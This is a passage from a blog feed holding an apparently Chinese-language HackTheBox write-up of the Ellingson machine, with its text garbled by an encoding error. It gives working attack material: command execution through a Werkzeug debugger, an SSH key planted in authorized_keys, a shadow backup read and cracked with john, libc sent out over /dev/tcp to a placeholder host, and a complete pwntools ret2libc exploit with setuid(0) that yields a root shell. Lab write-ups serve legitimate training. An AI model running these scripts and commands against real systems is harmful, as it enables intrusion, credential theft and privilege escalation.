\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png)\n\n```bash\n Love,Secret,Sex,God\n```\n\n```bash\nMargo Wallace\nEugene Belford\nDuke Ellingson\nHal\n```\n\nä¸€ä¸ªä¸€ä¸ªç”¨æˆ·å°è¯•ä¹‹åæ²¡ç»“æœ\n\n## Traceback å‘½ä»¤æ‰§è¡Œ\n\nç½‘é¡µæ˜¯ç”±`Werkzeug`é©±åŠ¨çš„ï¼Œå¹¶ä¸”å¼‚å¸¸å¤„ç†æ˜¯`Traceback`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png)\n\nè²Œä¼¼è¯´å¯ä»¥å‘½ä»¤æ‰§è¡Œ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png)\n\næˆåŠŸæ‰§è¡Œ `py` è¯­å¥\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png)\n\n## SSH å…¬é’¥\n\nåå¼¹ `shell` ï¼Œè¿™é‡Œæ€ä¹ˆå¼¹éƒ½æ²¡æ³•å¼¹è¿‡æ¥\n\næˆ‘ä»¬å°è¯•å†™å…¬é’¥\n\n```bash\n>>> import os;print(os.popen('whoami').read())\nhal\n\n>>> import os;print(os.popen('pwd').read())\n/\n\n>>> import os;print(os.popen('ls -al /home/hal').read())\ntotal 36\ndrwxrwx--- 5 hal  hal  4096 Jul 16  2021 .\ndrwxr-xr-x 6 root root 4096 Jul 16  2021 ..\n-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout\n-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc\ndrwx------ 2 hal  hal  4096 Jul 16  2021 .cache\ndrwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg\n-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile\ndrwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh\n-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo\n\n>>> import os;print(os.popen('echo \\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\\\" > /home/hal/.ssh/authorized_keys').read())\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png)\n\n## Crack Shadow\n\nå‘ç°`hal`ç”¨æˆ·æ‰€å±æœ‰è¶£çš„ç»„\n\n```bash\nhal@ellingson:~$ id\nuid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)\n```\n\næŸ¥æ‰¾ `group`ç»„æœ‰æƒé™çš„æ–‡ä»¶\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png)\n\nå‘ç°`shadow.bak`\n\n```bash\nhal@ellingson:~$ cat /var/backups/shadow.bak \nroot:*:17737:0:99999:7:::\ndaemon:*:17737:0:99999:7:::\nbin:*:17737:0:99999:7:::\nsys:*:17737:0:99999:7:::\nsync:*:17737:0:99999:7:::\ngames:*:17737:0:99999:7:::\nman:*:17737:0:99999:7:::\nlp:*:17737:0:99999:7:::\nmail:*:17737:0:99999:7:::\nnews:*:17737:0:99999:7:::\nuucp:*:17737:0:99999:7:::\nproxy:*:17737:0:99999:7:::\nwww-data:*:17737:0:99999:7:::\nbackup:*:17737:0:99999:7:::\nlist:*:17737:0:99999:7:::\nirc:*:17737:0:99999:7:::\ngnats:*:17737:0:99999:7:::\nnobody:*:17737:0:99999:7:::\nsystemd-network:*:17737:0:99999:7:::\nsystemd-resolve:*:17737:0:99999:7:::\nsyslog:*:17737:0:99999:7:::\nmessagebus:*:17737:0:99999:7:::\n_apt:*:17737:0:99999:7:::\nlxd:*:17737:0:99999:7:::\nuuidd:*:17737:0:99999:7:::\ndnsmasq:*:17737:0:99999:7:::\nlandscape:*:17737:0:99999:7:::\npollinate:*:17737:0:99999:7:::\nsshd:*:17737:0:99999:7:::\ntheplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::\nhal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::\nmargo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::\nduke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::\n```\n\n`john`ç ´è§£\n\n```bash\nâœ  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword123      (theplague)     \niamgod$08        (margo)     \n2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7Â¡Vamos!\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\nçš„åˆ°ä¸¤ä¸ªå¯†ç ï¼Œå…¶ä¸­`theplague`çš„å¯†ç æ˜¯ä¸æ­£ç¡®çš„ï¼Œ`margo`çš„å¯†ç æ˜¯æ­£ç¡®çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png)\n\n`margo`ç”¨æˆ·å¯ä»¥æ‹¿åˆ°`user.txt`\n\n```bash\nmargo@ellingson:~$ cat user.txt \ne6e956999a23f338ffd6d933bf79ca9c\n```\n\n## ç¼“å†²åŒºæº¢å‡º\n\n### æ£€æŸ¥ç¨‹åº\n\nè¿™é‡Œå¤§è‡´çœ‹äº†ä¸€ä¼šæ„Ÿè§‰æ²¡ä»€ä¹ˆé—®é¢˜\n\n```bash\nmargo@ellingson:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/bin/at              \n/usr/bin/newgrp       \n/usr/bin/pkexec           \n/usr/bin/passwd             \n/usr/bin/gpasswd            \n/usr/bin/garbage               \n/usr/bin/newuidmap            \n/usr/bin/sudo                 \n/usr/bin/traceroute6.iputils\n/usr/bin/chfn\n/usr/bin/newgidmap                         \n/usr/bin/chsh                             \n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/bin/su                     \n/bin/umount                 \n/bin/ntfs-3g                   \n/bin/ping                     \n/bin/mount                    \n/bin/fusermount\n```\n\nä½†æ˜¯é—®é¢˜å‡ºç°åœ¨`garbage` ï¼Œæˆ‘ä»¥ä¸ºå®ƒæ˜¯`gc`ï¼ˆGarbage Collectionï¼‰\n\nè¿è¡Œå®ƒçš„æ—¶å€™ï¼Œä¼šè®©ä½ è¾“å…¥å¯†ç \n\n```bash\nmargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n```\n\næ‹‰å‡ºå»é€†å‘çœ‹ä¸€çœ¼\n\n```bash\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  if ( !(unsigned int)auth(v4) )\n    exit(-1);\n  puts(\"[+] W0rM || Control Application\");\n  puts(\"[+] ---------------------------\");\n  puts(\"Select Option\");\n  puts(\"1: Check Balance\");\n  puts(\"2: Launch\");\n  puts(\"3: Cancel\");\n  puts(\"4: Exit\");\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        printf(\"> \");\n        __isoc99_scanf(\"%d%*c\", &v3);\n        if ( v3 != 2 )\n          break;\n        launch();\n      }\n      if ( v3 > 2 )\n        break;\n      if ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    if ( v3 != 3 )\n    {\n      if ( v3 == 4 )\n        exit(0);\nLABEL_14:\n      puts(\"Unknown option\");\n      exit(-1);\n    }\n    cancel();\n  }\n}\n```\n\næˆ‘ä»¬åœ¨å¼€å§‹è¿è¡Œçš„ `auth` å‡½æ•°ä¸­å‘ç°äº†å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\nä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥å¯†ç çš„åœ°æ–¹ï¼Œä¼šæœ‰ç¼“å†²åŒºæº¢å‡ºï¼Œ`gets()` å‡½æ•°ä¼šæ— é™åˆ¶åœ°è¯»å–ç”¨æˆ·çš„è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚`200`ä¸ªå­—ç¬¦ï¼‰ï¼Œå¤šå‡ºæ¥çš„`100`ä¸ªå­—ç¬¦å°±ä¼šæº¢å‡ºï¼Œè¦†ç›–æ‰æ ˆä¸Š `s1` ç›¸é‚»çš„å…¶ä»–æ•°æ®ã€‚\n\n```bash\n__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  printf(\"Enter access password: \");\n  gets(s1);\n  putchar(10);\n  if ( !strcmp(s1, \"N3veRF3@r1iSh3r3!\") )\n  {\n    strcpy(dest, \"access granted for user: \");\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\"access granted.\");\n    return 1LL;\n  }\n  else\n  {\n    puts(\"access denied.\");\n    return 0LL;\n  }\n}\n```\n\n`64`ä½ç¨‹åº\n\n```bash\nâœ  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n```\n\nä¿æŠ¤æªæ–½æƒ…å†µï¼Œå¼€å¯äº†`NX` \n\n```bash\nâœ  Ellingson checksec garbage \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n```\n\næ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº† `ALSR` ï¼Œå¼€å¯äº†å®Œå…¨`ALSR`\n\n```bash\nmargo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space\n2\n```\n\nè¿™é‡Œè¦ä½¿ç”¨ `ret2libc` æ”»å‡»\n\n### å¯»æ‰¾ä¸€ä¸ªçœŸå®çš„åœ°å€\n\né¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹`libc`æ–‡ä»¶\n\n```bash\nmargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n```\n\nå°†`/lib/x86_64-linux-gnu/libc.so.6`ä¸‹è½½åˆ°é¶æœºä¸­\n\n```bash\n// kali\nâœ  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n```\n\né¦–å…ˆåˆ¤æ–­å¡«å……å€¼ï¼Œè¿™é‡Œä½¿ç”¨`garbage` \n\n```bash\n(pwn) âœ  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n```\n\nç¨‹åºæœä¸å…¶ç„¶å´©æºƒäº†\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png)\n\nè®¡ç®—åç§»å€¼ï¼Œè¿™é‡Œä½¿ç”¨`msf`\n\n```bash\nâœ  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png)\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) âœ  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n```\n\nå¾—åˆ°åç§»å€¼`136` ï¼ˆPSï¼šè¿™é‡Œä½¿ç”¨`pwndbg`çš„`cyclic`æ— æ³•å¾—åˆ°æ­£ç¡®åç§»å€¼ï¼Œä½†æ˜¯`WP`ä¸­ä½¿ç”¨`gef`ç­‰éƒ½å¯ä»¥å¾ˆå®¹æ˜“å°±å¾—åˆ°åç§»å€¼ï¼‰\n\nå¾—åˆ°åç§»å€¼åï¼Œæˆ‘ä»¬é€‰æ‹©ä¸€ä¸‹è·å¾—å“ªä¸ª`plt`å‡½æ•°çš„çœŸå®åœ°å€\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: printf@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: read@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: exit@plt\n```\n\n`x64` ä¼ å‚éœ€è¦ä½¿ç”¨å¯„å­˜å™¨ï¼Œ`0x000000000040179b` ç¬¦åˆ\n\n```bash\n(pwn) âœ  Ellingson ROPgadget --binary garbage --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n```\n\nè¿™é‡Œé€‰æ‹©è·å¾—`puts@plt` ï¼Œæˆ‘ä»¬é€šè¿‡`pwn`è¿æ¥`ssh` æ¥è°ƒè¯•\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_add:{hex(puts_real_add)}\")\n```\n\nè¿è¡Œåæˆ‘ä»¬çš„å¾—åˆ°äº†`put`çš„çœŸå®åœ°å€`0x7f8eed3569c0`\n\n```bash\n(pwn) âœ  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_add:0x7f8eed3569c0\n```\n\n### å¾—åˆ°åŸºåœ°å€\n\nåŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n```\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n```\n\n### è·å¾—å…¶ä»–åœ°å€\n\nå¾—åˆ°åŸºåœ°å€åï¼Œæˆ‘ä»¬è¦å¾—åˆ° `system` å’Œ `/bin/sh`çš„åœ°å€\n\nå‡½æ•°çœŸå®åœ°å€ = åŸºåœ°å€ + å‡½æ•°åç§»å€¼\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n```\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n```\n\n### GetShell\n\nå¾—åˆ°éœ€è¦çš„åœ°å€åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè·å–`Shell`äº†\n\nå†æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª`ret`æ¥å®ç°å †æ ˆå¹³è¡¡\n\n```bash\n(pwn) âœ  Ellingson ROPgadget --binary garbage --only \"ret\"    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n```\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\nç„¶åæˆ‘ä»¬è¿è¡Œï¼Œä½†æ˜¯æƒé™åªæ˜¯ `margo`çš„æƒé™\n\n```bash\n$ $ id\nuid=1002(margo) gid=1002(margo) groups=1002(margo)\n```\n\n### GetRootShell\n\næˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå°†`shell`æƒé™æå‡ï¼Œå¯ä»¥ä½¿ç”¨`setuid`\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym['setuid']\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n```\n\nè¿è¡Œè·å¾— `RootShell`\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n# $ id\nuid=0(root) gid=1002(margo) groups=1002(margo)\n```\n\n```bash\n# $ cat /root/root.txt\nd87f7aac2d13c429b8d30e11be174dd6\n```\n\n## æ€»ç»“\n\nçˆ½ã€‚\n\næ‰“åˆ°ç¼“å†²åŒºæº¢å‡ºæ— ä»ä¸‹æ‰‹ï¼ŒèŠ±äº†ä¸€å¤©å¤šæ—¶é—´æ¶è¡¥`ROP` ï¼Œç„¶åä¸€å‘½é€šå…³\n\nå¤ªçˆ½äº†ã€‚\n\n![image.gif](/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif)\n",
            "url": "https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson",
            "title": "HackTheBox - Machine - Ellingson",
            "summary": "Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon è®¿é—®HTTP å†…å®¹å‘Šè¯‰æˆ‘ä»¬ä»–ä»¬è¢«Ellingsonç—…æ¯’ç»™å‹’ç´¢äº†ï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…ä¸èƒ½è®¿é—®æœåŠ¡è¶…è¿‡äº”æ¬¡ï¼Œå¦åˆ™ä¼šè¢«ban (ç›®å½•æ‰«æä¹Ÿä¸è¡Œ...",
            "date_modified": "2025-06-15T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linux",
                "PWN",
                "ret2libc",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap",
